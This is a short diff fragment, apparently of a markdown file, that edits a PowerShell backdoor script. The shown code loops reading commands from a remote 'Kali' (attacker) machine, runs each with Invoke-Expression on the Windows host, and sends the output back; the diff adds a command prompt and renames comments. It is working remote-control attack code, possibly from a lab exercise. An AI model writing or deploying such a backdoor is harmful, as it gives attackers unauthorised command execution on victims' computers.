@@ -29,7 +29,9 @@ $writer.WriteLine("Connected to backdoor!")
 $writer.Flush()
 
 while ($true) {
-    # Receive command from the attacker
+    # Receive command from the Kali
+    $writer.Write("> ")  
+    $writer.Flush()    
     $command = $reader.ReadLine()
     
     # If the command is "exit", close the connection
@@ -40,12 +42,11 @@ while ($true) {
     # Execute the command on the Windows machine and capture output
     $output = Invoke-Expression $command 2>&1
     
-    # Send the output back to the attacker
+    # Send the output back to the Kali
     $writer.WriteLine($output)
     $writer.Flush()
 }
 
-# Close the connection
 $client.Close()
 ```
 
